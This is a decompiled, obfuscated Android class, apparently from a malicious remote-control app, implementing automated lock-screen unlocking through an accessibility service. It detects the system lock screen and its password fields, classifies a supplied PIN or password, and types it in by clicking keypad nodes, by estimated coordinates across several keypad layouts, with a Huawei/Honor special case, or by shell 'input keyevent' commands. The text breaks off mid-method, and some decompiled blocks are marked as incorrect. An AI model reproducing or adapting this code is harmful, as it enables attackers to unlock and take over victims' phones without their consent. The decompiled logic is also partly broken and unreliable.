package p000;

import android.app.Instrumentation;
import android.graphics.Rect;
import android.os.Build;
import android.util.DisplayMetrics;
import android.view.accessibility.AccessibilityNodeInfo;
import com.storm.safe.rock.service.dqtvuisjd;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.concurrent.TimeUnit;
import kotlin.Pair;
import kotlin.collections.AbstractC0770a1;
import kotlin.jvm.internal.Ref$BooleanRef;
import kotlin.text.AbstractC0779a1;
import kotlin.text.Regex;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* loaded from: classes2.dex */
public final class b60 {

    /* renamed from: a0 */
    public final dqtvuisjd f45722a0;

    /* renamed from: a1 */
    public final dqtvuisjd f45723a1;

    /* renamed from: a2 */
    public final z50 f45724a2;

    /* renamed from: a3 */
    public long f45725a3;

    /* renamed from: a4 */
    public da0 f45726a4;

    static {
        new a60(null);
    }

    public b60(dqtvuisjd dqtvuisjdVar, dqtvuisjd dqtvuisjdVar2, z50 z50Var) {
        t60.m214695b6(z50Var, "inputController");
        this.f45722a0 = dqtvuisjdVar;
        this.f45723a1 = dqtvuisjdVar2;
        this.f45724a2 = z50Var;
    }

    /* renamed from: a1 */
    public static void m210540a1(AccessibilityNodeInfo accessibilityNodeInfo, LinkedHashMap linkedHashMap) {
        String string;
        String string2;
        try {
            CharSequence text = accessibilityNodeInfo.getText();
            String str = "";
            if (text == null || (string = text.toString()) == null) {
                string = "";
            }
            CharSequence contentDescription = accessibilityNodeInfo.getContentDescription();
            if (contentDescription != null && (string2 = contentDescription.toString()) != null) {
                str = string2;
            }
            if (!new Regex("\\d").m213646a2(string)) {
                string = new Regex("\\d").m213646a2(str) ? str : null;
            }
            if (string != null && accessibilityNodeInfo.isClickable()) {
                accessibilityNodeInfo.getBoundsInScreen(new Rect());
                linkedHashMap.put(string, new Pair(Float.valueOf(r0.centerX()), Float.valueOf(r0.centerY())));
            }
            int childCount = accessibilityNodeInfo.getChildCount();
            for (int i = 0; i < childCount; i++) {
                AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i);
                if (child != null) {
                    m210540a1(child, linkedHashMap);
                    child.recycle();
                }
            }
        } catch (Exception e) {
            t60.m214705c6("InputManager", "查找数字按钮失败", e);
        }
    }

    /* renamed from: a2 */
    public static boolean m210541a2(AccessibilityNodeInfo accessibilityNodeInfo, String str) {
        String string;
        String string2;
        String string3;
        String string4;
        try {
            CharSequence text = accessibilityNodeInfo.getText();
            String str2 = "";
            if (text == null || (string4 = text.toString()) == null || (string = AbstractC0779a1.m213687e0(string4).toString()) == null) {
                string = "";
            }
            CharSequence contentDescription = accessibilityNodeInfo.getContentDescription();
            if (contentDescription != null && (string2 = contentDescription.toString()) != null && (string3 = AbstractC0779a1.m213687e0(string2).toString()) != null) {
                str2 = string3;
            }
            if ((string.equals(str) || str2.equals(str)) && accessibilityNodeInfo.isClickable()) {
                if (accessibilityNodeInfo.performAction(16)) {
                    return true;
                }
                t60.m214726f4("InputManager", "⚠️ 节点点击失败: " + str);
            }
            int childCount = accessibilityNodeInfo.getChildCount();
            for (int i = 0; i < childCount; i++) {
                AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i);
                if (child != null) {
                    try {
                        if (m210541a2(child, str)) {
                            return true;
                        }
                    } finally {
                        child.recycle();
                    }
                }
            }
            return false;
        } catch (Exception e) {
            tz0.m214808a8("查找数字节点异常: ", str, "InputManager", e);
            return false;
        }
    }

    /* JADX WARN: Code restructure failed: missing block: B:49:0x00a3, code lost:
    
        if (r7.isPassword() != false) goto L50;
     */
    /* JADX WARN: Code restructure failed: missing block: B:50:0x00a5, code lost:
    
        r6.f57622a0 = true;
     */
    /* JADX WARN: Code restructure failed: missing block: B:51:0x00a7, code lost:
    
        return;
     */
    /* renamed from: a4 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public static final void m210542a4(Ref$BooleanRef ref$BooleanRef, AccessibilityNodeInfo accessibilityNodeInfo, int i) {
        String lowerCase;
        String lowerCase2;
        String string;
        String string2;
        String string3;
        if (i > 10 || ref$BooleanRef.f57622a0) {
            return;
        }
        CharSequence className = accessibilityNodeInfo.getClassName();
        String lowerCase3 = "";
        if (className == null || (string3 = className.toString()) == null) {
            lowerCase = "";
        } else {
            lowerCase = string3.toLowerCase(Locale.ROOT);
            t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(Locale.ROOT)");
        }
        CharSequence text = accessibilityNodeInfo.getText();
        if (text == null || (string2 = text.toString()) == null) {
            lowerCase2 = "";
        } else {
            lowerCase2 = string2.toLowerCase(Locale.ROOT);
            t60.m214694b5(lowerCase2, "this as java.lang.String).toLowerCase(Locale.ROOT)");
        }
        CharSequence contentDescription = accessibilityNodeInfo.getContentDescription();
        if (contentDescription != null && (string = contentDescription.toString()) != null) {
            lowerCase3 = string.toLowerCase(Locale.ROOT);
            t60.m214694b5(lowerCase3, "this as java.lang.String).toLowerCase(Locale.ROOT)");
        }
        if (AbstractC0779a1.m213652a5(lowerCase, "edittext", false)) {
            List list = dh0.f55772c2;
            if (list == null || !list.isEmpty()) {
                Iterator it = list.iterator();
                while (it.hasNext()) {
                    if (AbstractC0779a1.m213652a5(lowerCase2, (String) it.next(), true)) {
                        break;
                    }
                }
            }
            List list2 = dh0.f55772c2;
            if (list2 == null || !list2.isEmpty()) {
                Iterator it2 = list2.iterator();
                while (it2.hasNext()) {
                    if (AbstractC0779a1.m213652a5(lowerCase3, (String) it2.next(), true)) {
                        break;
                    }
                }
            }
        }
        int childCount = accessibilityNodeInfo.getChildCount();
        for (int i2 = 0; i2 < childCount; i2++) {
            AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i2);
            if (child != null) {
                m210542a4(ref$BooleanRef, child, i + 1);
                child.recycle();
            }
        }
    }

    /* renamed from: a5 */
    public static final void m210543a5(Ref$BooleanRef ref$BooleanRef, AccessibilityNodeInfo accessibilityNodeInfo, int i) {
        String lowerCase;
        String string;
        String string2;
        if (i > 10 || ref$BooleanRef.f57622a0) {
            return;
        }
        CharSequence text = accessibilityNodeInfo.getText();
        String lowerCase2 = "";
        if (text == null || (string2 = text.toString()) == null) {
            lowerCase = "";
        } else {
            lowerCase = string2.toLowerCase(Locale.ROOT);
            t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(Locale.ROOT)");
        }
        CharSequence contentDescription = accessibilityNodeInfo.getContentDescription();
        if (contentDescription != null && (string = contentDescription.toString()) != null) {
            lowerCase2 = string.toLowerCase(Locale.ROOT);
            t60.m214694b5(lowerCase2, "this as java.lang.String).toLowerCase(Locale.ROOT)");
        }
        ArrayList arrayListM213298i5 = AbstractC0715je.m213298i5(AbstractC0715je.m213298i5(AbstractC0715je.m213298i5(AbstractC0715je.m213298i5(AbstractC0715je.m213298i5(dh0.f55774c4, dh0.f55775c5), dh0.f55772c2), dh0.f55779c9), dh0.f55773c3), dh0.f55776c6);
        if (!arrayListM213298i5.isEmpty()) {
            int size = arrayListM213298i5.size();
            int i2 = 0;
            while (i2 < size) {
                Object obj = arrayListM213298i5.get(i2);
                i2++;
                String str = (String) obj;
                if (AbstractC0779a1.m213652a5(lowerCase, str, false) || AbstractC0779a1.m213652a5(lowerCase2, str, false)) {
                    ref$BooleanRef.f57622a0 = true;
                    return;
                }
            }
        }
        int childCount = accessibilityNodeInfo.getChildCount();
        for (int i3 = 0; i3 < childCount; i3++) {
            AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i3);
            if (child != null) {
                m210543a5(ref$BooleanRef, child, i + 1);
                child.recycle();
            }
        }
    }

    /* renamed from: a8 */
    public static boolean m210544a8() {
        String str = Build.BRAND;
        t60.m214694b5(str, "BRAND");
        Locale locale = Locale.ROOT;
        String lowerCase = str.toLowerCase(locale);
        t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(Locale.ROOT)");
        String str2 = Build.MANUFACTURER;
        t60.m214694b5(str2, "MANUFACTURER");
        String lowerCase2 = str2.toLowerCase(locale);
        t60.m214694b5(lowerCase2, "this as java.lang.String).toLowerCase(Locale.ROOT)");
        return AbstractC0779a1.m213652a5(lowerCase, "huawei", false) || AbstractC0779a1.m213652a5(lowerCase, "honor", false) || AbstractC0779a1.m213652a5(lowerCase2, "huawei", false) || AbstractC0779a1.m213652a5(lowerCase2, "honor", false);
    }

    /* renamed from: a9 */
    public static boolean m210545a9(String str) {
        boolean z;
        boolean z2;
        int i = 0;
        while (true) {
            if (i >= str.length()) {
                z = false;
                break;
            }
            if (Character.isDigit(str.charAt(i))) {
                z = true;
                break;
            }
            i++;
        }
        int i2 = 0;
        while (true) {
            if (i2 >= str.length()) {
                z2 = false;
                break;
            }
            if (Character.isLetter(str.charAt(i2))) {
                z2 = true;
                break;
            }
            i2++;
        }
        return z && z2;
    }

    /* renamed from: b1 */
    public static void m210546b1(int i) {
        String strM30b1 = i != 3 ? i != 4 ? i != 62 ? i != 82 ? i != 66 ? i != 67 ? AbstractC0003a2.m30b1("按键(", i, ")") : "删除键" : "回车键" : "菜单键" : "空格键" : "返回键" : "主页键";
        try {
            if (m210547b4(i)) {
                return;
            }
            try {
                new Instrumentation().sendKeyDownUpSync(i);
            } catch (Exception unused) {
                t60.m214695b6("硬件按键事件发送失败: " + i, "msg");
                if (i == 66) {
                    return;
                }
                t60.m214726f4("InputManager", "⚠️ 所有按键发送方法都失败了: " + strM30b1);
            }
        } catch (Exception e) {
            tz0.m214808a8("❌ 执行按键事件失败: ", strM30b1, "InputManager", e);
        }
    }

    /* renamed from: b4 */
    public static boolean m210547b4(int i) throws IOException {
        try {
            for (String str : i == 66 ? new String[]{"input keyevent 66", "input keyevent KEYCODE_ENTER"} : new String[]{"input keyevent " + i}) {
                try {
                    Process processExec = Runtime.getRuntime().exec(str);
                    TimeUnit timeUnit = TimeUnit.SECONDS;
                    if (processExec.waitFor(2L, TimeUnit.SECONDS)) {
                        int iExitValue = processExec.exitValue();
                        if (iExitValue == 0) {
                            return true;
                        }
                        t60.m214726f4("InputManager", "Shell按键命令失败: " + str + ", exitCode: " + iExitValue);
                    } else {
                        t60.m214726f4("InputManager", "Shell按键命令超时: " + str);
                        processExec.destroyForcibly();
                    }
                } catch (Exception unused) {
                    t60.m214695b6("Shell命令异常: " + str, "msg");
                }
            }
        } catch (Exception unused2) {
            t60.m214695b6("Shell按键命令执行异常: " + i, "msg");
        }
        return false;
    }

    /* JADX WARN: Removed duplicated region for block: B:130:0x0129 A[EXC_TOP_SPLITTER, SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:135:0x0137 A[SYNTHETIC] */
    /* renamed from: b5 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public static boolean m210548b5(String str) throws InterruptedException {
        boolean z;
        int length;
        int i;
        int i2;
        int i3;
        try {
            length = str.length();
        } catch (Exception e) {
            e = e;
            z = false;
        }
        for (i = 0; i < length; i++) {
            char cCharAt = str.charAt(i);
            char lowerCase = Character.toLowerCase(cCharAt);
            if (lowerCase == 'a') {
                i3 = 29;
            } else if (lowerCase == 'b') {
                i3 = 30;
            } else if (lowerCase == 'c') {
                i3 = 31;
            } else if (lowerCase == 'd') {
                i3 = 32;
            } else if (lowerCase == 'e') {
                i3 = 33;
            } else if (lowerCase == 'f') {
                i3 = 34;
            } else if (lowerCase == 'g') {
                i3 = 35;
            } else if (lowerCase == 'h') {
                i3 = 36;
            } else if (lowerCase == 'i') {
                i3 = 37;
            } else if (lowerCase == 'j') {
                i3 = 38;
            } else if (lowerCase == 'k') {
                i3 = 39;
            } else if (lowerCase == 'l') {
                i3 = 40;
            } else if (lowerCase == 'm') {
                i3 = 41;
            } else if (lowerCase == 'n') {
                i3 = 42;
            } else if (lowerCase == 'o') {
                i3 = 43;
            } else {
                if (lowerCase == 'p') {
                    i2 = -1;
                    i3 = 44;
                    z = false;
                    if (i3 == i2) {
                        t60.m214726f4("InputManager", "⚠️ 无法找到字符 '" + cCharAt + "' 对应的按键");
                        return z;
                    }
                    try {
                        m210546b1(i3);
                        Thread.sleep(100L);
                    } catch (Exception e2) {
                        e = e2;
                    }
                    e = e2;
                    t60.m214705c6("InputManager", "按键事件输入失败", e);
                    return z;
                }
                if (lowerCase == 'q') {
                    i3 = 45;
                } else if (lowerCase == 'r') {
                    i3 = 46;
                } else if (lowerCase == 's') {
                    i3 = 47;
                } else if (lowerCase == 't') {
                    i3 = 48;
                } else if (lowerCase == 'u') {
                    i3 = 49;
                } else if (lowerCase == 'v') {
                    i3 = 50;
                } else {
                    if (lowerCase != 'w') {
                        z = false;
                        int i4 = 52;
                        if (lowerCase != 'x') {
                            if (lowerCase == 'y') {
                                i3 = 53;
                            } else if (lowerCase == 'z') {
                                i3 = 54;
                            } else if (lowerCase == '0') {
                                i3 = 7;
                            } else if (lowerCase == '1') {
                                i3 = 8;
                            } else if (lowerCase == '2') {
                                i3 = 9;
                            } else if (lowerCase == '3') {
                                i3 = 10;
                            } else if (lowerCase == '4') {
                                i3 = 11;
                            } else if (lowerCase == '5') {
                                i3 = 12;
                            } else if (lowerCase == '6') {
                                i3 = 13;
                            } else {
                                i4 = 55;
                                if (lowerCase == '7') {
                                    i3 = 14;
                                } else if (lowerCase == '8') {
                                    i3 = 15;
                                } else if (lowerCase == '9') {
                                    i3 = 16;
                                } else if (lowerCase == ' ') {
                                    i3 = 62;
                                } else if (lowerCase == '.') {
                                    i3 = 56;
                                } else {
                                    if (lowerCase != ',') {
                                        i2 = -1;
                                        i3 = -1;
                                        if (i3 == i2) {
                                        }
                                        e = e2;
                                    }
                                    i3 = i4;
                                }
                            }
                            i2 = -1;
                            if (i3 == i2) {
                            }
                            e = e2;
                        } else {
                            i3 = i4;
                            i2 = -1;
                            if (i3 == i2) {
                            }
                            e = e2;
                        }
                        t60.m214705c6("InputManager", "按键事件输入失败", e);
                        return z;
                    }
                    i3 = 51;
                }
            }
            i2 = -1;
            z = false;
            if (i3 == i2) {
            }
            e = e2;
            t60.m214705c6("InputManager", "按键事件输入失败", e);
            return z;
        }
        return true;
    }

    /* renamed from: a0 */
    public final Pair m210549a0(String str) {
        try {
            AccessibilityNodeInfo rootInActiveWindow = this.f45722a0.getRootInActiveWindow();
            if (rootInActiveWindow == null) {
                return null;
            }
            LinkedHashMap linkedHashMap = new LinkedHashMap();
            m210540a1(rootInActiveWindow, linkedHashMap);
            if (!linkedHashMap.isEmpty()) {
                for (Map.Entry entry : linkedHashMap.entrySet()) {
                }
                Pair pair = (Pair) linkedHashMap.get(str);
                if (pair != null) {
                    return pair;
                }
            }
            rootInActiveWindow.recycle();
            return null;
        } catch (Exception e) {
            t60.m214705c6("InputManager", "智能检测键盘布局失败", e);
            return null;
        }
    }

    /* renamed from: a3 */
    public final ArrayList m210550a3(int i, int i2) {
        float f;
        float f2;
        ArrayList arrayList = new ArrayList();
        float f3 = i2;
        float f4 = i;
        float f5 = f3 / f4;
        boolean z = f5 < 1.8f;
        float f6 = this.f45723a1.getResources().getDisplayMetrics().density;
        if (f5 > 2.2f) {
            f = 2.0f;
            f2 = 0.5f;
        } else if (f5 > 2.0f) {
            f = 2.0f;
            f2 = 0.55f;
        } else if (f5 > 1.8f) {
            f = 2.0f;
            f2 = 0.6f;
        } else {
            f = 2.0f;
            f2 = 0.65f;
        }
        float f7 = f4 * 0.25f;
        float f8 = f3 * f2;
        float f9 = f4 * 0.5f;
        float f10 = f4 * 0.75f;
        float f11 = (f2 + 0.08f) * f3;
        float f12 = 2;
        float f13 = f12 * 0.08f;
        float f14 = (f13 + f2) * f3;
        boolean z2 = z;
        float f15 = 3;
        float f16 = f15 * 0.08f;
        arrayList.add(new Pair("标准自适应布局", AbstractC0770a1.m213614f9(new Pair("1", new Pair(Float.valueOf(f7), Float.valueOf(f8))), new Pair("2", new Pair(Float.valueOf(f9), Float.valueOf(f8))), new Pair("3", new Pair(Float.valueOf(f10), Float.valueOf(f8))), new Pair("4", new Pair(Float.valueOf(f7), Float.valueOf(f11))), new Pair("5", new Pair(Float.valueOf(f9), Float.valueOf(f11))), new Pair("6", new Pair(Float.valueOf(f10), Float.valueOf(f11))), new Pair("7", new Pair(Float.valueOf(f7), Float.valueOf(f14))), new Pair("8", new Pair(Float.valueOf(f9), Float.valueOf(f14))), new Pair("9", new Pair(Float.valueOf(f10), Float.valueOf(f14))), new Pair("0", new Pair(Float.valueOf(f9), Float.valueOf((f16 + f2) * f3))))));
        float f17 = f5 > 2.2f ? 0.45f : f5 > 2.0f ? 0.5f : f5 > 1.8f ? 0.55f : 0.6f;
        float f18 = f3 * f17;
        Pair pair = new Pair("1", new Pair(Float.valueOf(f7), Float.valueOf(f18)));
        Pair pair2 = new Pair("2", new Pair(Float.valueOf(f9), Float.valueOf(f18)));
        Pair pair3 = new Pair("3", new Pair(Float.valueOf(f10), Float.valueOf(f18)));
        float f19 = (f17 + 0.07f) * f3;
        Pair pair4 = new Pair("4", new Pair(Float.valueOf(f7), Float.valueOf(f19)));
        Pair pair5 = new Pair("5", new Pair(Float.valueOf(f9), Float.valueOf(f19)));
        Pair pair6 = new Pair("6", new Pair(Float.valueOf(f10), Float.valueOf(f19)));
        float f20 = ((f12 * 0.07f) + f17) * f3;
        arrayList.add(new Pair("紧凑布局", AbstractC0770a1.m213614f9(pair, pair2, pair3, pair4, pair5, pair6, new Pair("7", new Pair(Float.valueOf(f7), Float.valueOf(f20))), new Pair("8", new Pair(Float.valueOf(f9), Float.valueOf(f20))), new Pair("9", new Pair(Float.valueOf(f10), Float.valueOf(f20))), new Pair("0", new Pair(Float.valueOf(f9), Float.valueOf(((0.07f * f15) + f17) * f3))))));
        float f21 = f5 > 2.2f ? 0.6f : f5 > 2.0f ? 0.65f : f5 > 1.8f ? 0.7f : 0.75f;
        float f22 = f3 * f21;
        Pair pair7 = new Pair("1", new Pair(Float.valueOf(f7), Float.valueOf(f22)));
        float f23 = f21;
        Pair pair8 = new Pair("2", new Pair(Float.valueOf(f9), Float.valueOf(f22)));
        Pair pair9 = new Pair("3", new Pair(Float.valueOf(f10), Float.valueOf(f22)));
        float f24 = (f23 + 0.09f) * f3;
        Pair pair10 = new Pair("4", new Pair(Float.valueOf(f7), Float.valueOf(f24)));
        Pair pair11 = new Pair("5", new Pair(Float.valueOf(f9), Float.valueOf(f24)));
        Pair pair12 = new Pair("6", new Pair(Float.valueOf(f10), Float.valueOf(f24)));
        float f25 = ((f12 * 0.09f) + f23) * f3;
        arrayList.add(new Pair("扩展布局", AbstractC0770a1.m213614f9(pair7, pair8, pair9, pair10, pair11, pair12, new Pair("7", new Pair(Float.valueOf(f7), Float.valueOf(f25))), new Pair("8", new Pair(Float.valueOf(f9), Float.valueOf(f25))), new Pair("9", new Pair(Float.valueOf(f10), Float.valueOf(f25))), new Pair("0", new Pair(Float.valueOf(f9), Float.valueOf(((0.09f * f15) + f23) * f3))))));
        float f26 = (f6 >= 3.0f ? 0.02f : f6 >= f ? 0.0f : -0.02f) + 0.58f;
        float f27 = f3 * f26;
        Pair pair13 = new Pair("1", new Pair(Float.valueOf(f7), Float.valueOf(f27)));
        Pair pair14 = new Pair("2", new Pair(Float.valueOf(f9), Float.valueOf(f27)));
        Pair pair15 = new Pair("3", new Pair(Float.valueOf(f10), Float.valueOf(f27)));
        float f28 = (f26 + 0.08f) * f3;
        Pair pair16 = new Pair("4", new Pair(Float.valueOf(f7), Float.valueOf(f28)));
        Pair pair17 = new Pair("5", new Pair(Float.valueOf(f9), Float.valueOf(f28)));
        Pair pair18 = new Pair("6", new Pair(Float.valueOf(f10), Float.valueOf(f28)));
        Float fValueOf = Float.valueOf(f7);
        float f29 = (f13 + f26) * f3;
        arrayList.add(new Pair("密度调整布局", AbstractC0770a1.m213614f9(pair13, pair14, pair15, pair16, pair17, pair18, new Pair("7", new Pair(fValueOf, Float.valueOf(f29))), new Pair("8", new Pair(Float.valueOf(f9), Float.valueOf(f29))), new Pair("9", new Pair(Float.valueOf(f10), Float.valueOf(f29))), new Pair("0", new Pair(Float.valueOf(f9), Float.valueOf((f16 + f26) * f3))))));
        float f30 = f4 * (z2 ? 0.2f : 0.25f);
        float f31 = f3 * 0.58f;
        float f32 = f4 * (z2 ? 0.8f : 0.75f);
        float f33 = 0.65999997f * f3;
        float f34 = (f13 + 0.58f) * f3;
        arrayList.add(new Pair("边距优化布局", AbstractC0770a1.m213614f9(new Pair("1", new Pair(Float.valueOf(f30), Float.valueOf(f31))), new Pair("2", new Pair(Float.valueOf(f9), Float.valueOf(f31))), new Pair("3", new Pair(Float.valueOf(f32), Float.valueOf(f31))), new Pair("4", new Pair(Float.valueOf(f30), Float.valueOf(f33))), new Pair("5", new Pair(Float.valueOf(f9), Float.valueOf(f33))), new Pair("6", new Pair(Float.valueOf(f32), Float.valueOf(f33))), new Pair("7", new Pair(Float.valueOf(f30), Float.valueOf(f34))), new Pair("8", new Pair(Float.valueOf(f9), Float.valueOf(f34))), new Pair("9", new Pair(Float.valueOf(f32), Float.valueOf(f34))), new Pair("0", new Pair(Float.valueOf(f9), Float.valueOf((f16 + 0.58f) * f3))))));
        return arrayList;
    }

    /* renamed from: a6 */
    public final void m210551a6(String str) throws InterruptedException {
        try {
            da0 da0Var = this.f45726a4;
            if (da0Var != null) {
                da0Var.m212577a4("numeric");
            }
            DisplayMetrics displayMetrics = this.f45723a1.getResources().getDisplayMetrics();
            int i = displayMetrics.widthPixels;
            int i2 = displayMetrics.heightPixels;
            AbstractC0770a1.m213614f9(new Pair("passwordLength", Integer.valueOf(str.length())), new Pair("screenWidth", Integer.valueOf(i)), new Pair("screenHeight", Integer.valueOf(i2)), new Pair("density", Float.valueOf(displayMetrics.density)), new Pair("webUnlockMode", Boolean.FALSE));
            dqtvuisjd.m211435k0("NUMERIC_PASSWORD_START", "开始数字密码坐标输入");
            int length = str.length();
            for (int i3 = 0; i3 < length; i3++) {
                char cCharAt = str.charAt(i3);
                if (!m210554b2(i, i2, String.valueOf(cCharAt))) {
                    t60.m214726f4("InputManager", "⚠️ 数字 " + cCharAt + " 点击可能失败");
                }
                if (i3 == str.length() - 1) {
                    Thread.sleep(500L);
                } else {
                    Thread.sleep(300L);
                }
            }
        } catch (Exception e) {
            t60.m214705c6("InputManager", "数字密码坐标输入失败", e);
        }
    }

    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Type inference failed for: r0v0, types: [java.lang.String] */
    /* JADX WARN: Type inference failed for: r0v5, types: [boolean] */
    /* renamed from: a7 */
    public final boolean m210552a7() {
        String lowerCase;
        boolean z;
        boolean z2;
        String string;
        String str = "InputManager";
        try {
            AccessibilityNodeInfo rootInActiveWindow = this.f45722a0.getRootInActiveWindow();
            if (rootInActiveWindow != null) {
                CharSequence packageName = rootInActiveWindow.getPackageName();
                if (packageName == null || (string = packageName.toString()) == null) {
                    lowerCase = "";
                } else {
                    lowerCase = string.toLowerCase(Locale.ROOT);
                    t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(Locale.ROOT)");
                }
                if (AbstractC0779a1.m213652a5(lowerCase, "systemui", false) || AbstractC0779a1.m213652a5(lowerCase, "lockscreen", false)) {
                    try {
                        Ref$BooleanRef ref$BooleanRef = new Ref$BooleanRef();
                        m210542a4(ref$BooleanRef, rootInActiveWindow, 0);
                        z = ref$BooleanRef.f57622a0;
                    } catch (Exception e) {
                        t60.m214705c6("InputManager", "检查密码输入框失败", e);
                        z = false;
                    }
                    if (!z) {
                        try {
                            Ref$BooleanRef ref$BooleanRef2 = new Ref$BooleanRef();
                            m210543a5(ref$BooleanRef2, rootInActiveWindow, 0);
                            str = ref$BooleanRef2.f57622a0;
                            z2 = str;
                        } catch (Exception e2) {
                            t60.m214705c6("InputManager", "检查解锁元素失败", e2);
                            z2 = false;
                        }
                        if (!z2) {
                            return false;
                        }
                    }
                    return true;
                }
            }
            return false;
        } catch (Exception e3) {
            t60.m214705c6(str, "检测锁屏界面失败", e3);
            return false;
        }
    }

    /* renamed from: b0 */
    public final void m210553b0() throws InterruptedException {
        dqtvuisjd dqtvuisjdVar = this.f45722a0;
        try {
            Thread.sleep(300L);
            dqtvuisjdVar.m211497j1(513.0f, 1870.0f);
            AbstractC0770a1.m213614f9(new Pair("x", 513), new Pair("y", 1870), new Pair("device", Build.BRAND + " " + Build.MODEL));
            dqtvuisjd.m211435k0("HUAWEI_HONOR_SPECIAL_CLICK", "华为荣耀特殊坐标点击");
        } catch (Exception e) {
            t60.m214705c6("InputManager", "华为荣耀特殊点击失败", e);
        }
    }

    /* renamed from: b2 */
    public final boolean m210554b2(int i, int i2, String str) throws InterruptedException {
        boolean z;
        boolean zM210541a2;
        AccessibilityNodeInfo rootInActiveWindow;
        String str2 = "x";
        dqtvuisjd dqtvuisjdVar = this.f45722a0;
        t60.m214695b6(str, "digit");
        try {
            this.f45725a3 = System.currentTimeMillis();
            try {
                rootInActiveWindow = dqtvuisjdVar.getRootInActiveWindow();
            } catch (Exception e) {
                t60.m214705c6("InputManager", "直接节点点击异常: ".concat(str), e);
            }
            if (rootInActiveWindow == null) {
                zM210541a2 = false;
            } else {
                zM210541a2 = m210541a2(rootInActiveWindow, str);
                rootInActiveWindow.recycle();
            }
            if (zM210541a2) {
                return true;
            }
            t60.m214726f4("InputManager", "⚠️ 直接节点点击失败，尝试坐标点击");
            Pair pairM210549a0 = m210549a0(str);
            if (pairM210549a0 == null) {
                t60.m214726f4("InputManager", "❌ 智能检测未找到数字键盘布局");
            } else {
                if (m210555b3((int) ((Number) pairM210549a0.f57556a0).floatValue(), (int) ((Number) pairM210549a0.f57557a1).floatValue(), str)) {
                    return true;
                }
                t60.m214726f4("InputManager", "❌ 智能检测坐标点击失败: ".concat(str));
            }
            ArrayList arrayListM210550a3 = m210550a3(i, i2);
            int size = arrayListM210550a3.size();
            int i3 = 0;
            while (i3 < size) {
                Object obj = arrayListM210550a3.get(i3);
                int i4 = i3 + 1;
                Pair pair = (Pair) obj;
                String str3 = (String) pair.f57556a0;
                Pair pair2 = (Pair) ((Map) pair.f57557a1).get(str);
                if (pair2 != null) {
                    int iFloatValue = (int) ((Number) pair2.f57556a0).floatValue();
                    int iFloatValue2 = (int) ((Number) pair2.f57557a1).floatValue();
                    String str4 = "数字密码键盘点击: " + str;
                    Pair pair3 = new Pair("digit", str);
                    z = false;
                    try {
                        Pair pair4 = new Pair(str2, Integer.valueOf(iFloatValue));
                        ArrayList arrayList = arrayListM210550a3;
                        int i5 = size;
                        Pair pair5 = new Pair("y", Integer.valueOf(iFloatValue2));
                        Pair pair6 = new Pair("layout", str3);
                        StringBuilder sb = new StringBuilder();
                        sb.append(i);
                        sb.append(str2);
                        String str5 = str2;
                        sb.append(i2);
                        AbstractC0770a1.m213614f9(pair3, pair4, pair5, pair6, new Pair("screenSize", sb.toString()), new Pair("inputMethod", "numeric_keypad_coordinate"));
                        dqtvuisjd.m211435k0("CLICK", str4);
                        if (m210555b3(iFloatValue, iFloatValue2, str)) {
                            return true;
                        }
                        t60.m214726f4("InputManager", "⚠️ 布局 " + str3 + " 点击失败，尝试下一个");
                        Thread.sleep(200L);
                        arrayListM210550a3 = arrayList;
                        size = i5;
                        i3 = i4;
                        str2 = str5;
                    } catch (Exception e2) {
                        e = e2;
                        t60.m214705c6("InputManager", "❌ 数字密码键盘点击异常: ".concat(str), e);
                        return z;
                    }
                } else {
                    i3 = i4;
                }
            }
            z = false;
            t60.m214704c5("InputManager", "❌ 所有数字密码键盘布局都失败: " + str);
            return false;
        } catch (Exception e3) {
            e = e3;
            z = false;
            t60.m214705c6("InputManager", "❌ 数字密码键盘点击异常: ".concat(str), e);
            return z;
        }
    }

    /* renamed from: b3 */
    public final boolean m210555b3(int i, int i2, String str) throws InterruptedException {
        dqtvuisjd dqtvuisjdVar = this.f45722a0;
        try {
            try {
                Thread.sleep(50L);
                dqtvuisjdVar.m211497j1(i, i2);
                Thread.sleep(200L);
                return true;
            } catch (Exception unused) {
                t60.m214726f4("InputManager", "简化点击第1次失败，重试: 数字" + str + " 在 (" + i + ", " + i2 + ")");
                Thread.sleep(100L);
                dqtvuisjdVar.m211497j1((float) i, (float) i2);
                Thread.sleep(200L);
                return true;
            }
        } catch (Exception e) {
            StringBuilder sbM40c1 = AbstractC0003a2.m40c1("简化点击重试也失败: 数字", str, " 在 (", i, ", ");
            sbM40c1.append(i2);
            sbM40c1.append(")");
            t60.m214705c6("InputManager", sbM40c1.toString(), e);
            return false;
        }
    }

    /* renamed from: b6 */
    public final void m210556b6(String str) {
        String str2;
        boolean z;
        boolean z2;
        int i = 0;
        while (true) {
            try {
                if (i >= str.length()) {
                    int length = str.length();
                    if (length != 4 && length != 6 && 5 <= length) {
                    }
                    str2 = "numeric";
                } else if (Character.isDigit(str.charAt(i))) {
                    i++;
                } else if (!m210545a9(str)) {
                    int i2 = 0;
                    while (true) {
                        if (i2 >= str.length()) {
                            str2 = "alphabetic";
                            break;
                        } else {
                            if (!Character.isLetter(str.charAt(i2))) {
                                str2 = "complex";
                                break;
                            }
                            i2++;
                        }
                    }
                } else {
                    str2 = "mixed";
                }
            } catch (Exception e) {
                t60.m214705c6("InputManager", "锁屏文本输入失败", e);
                return;
            }
        }
        AbstractC0770a1.m213614f9(new Pair("passwordType", str2), new Pair("length", Integer.valueOf(str.length())), new Pair("inputMethod", "lockscreen_input"), new Pair("webUnlockMode", Boolean.FALSE));
        dqtvuisjd.m211435k0("PASSWORD_ANALYSIS", "锁屏密码类型分析");
        for (int i3 = 0; i3 < str.length(); i3++) {
            if (!Character.isDigit(str.charAt(i3))) {
                boolean zM210545a9 = m210545a9(str);
                z50 z50Var = this.f45724a2;
                if (!zM210545a9) {
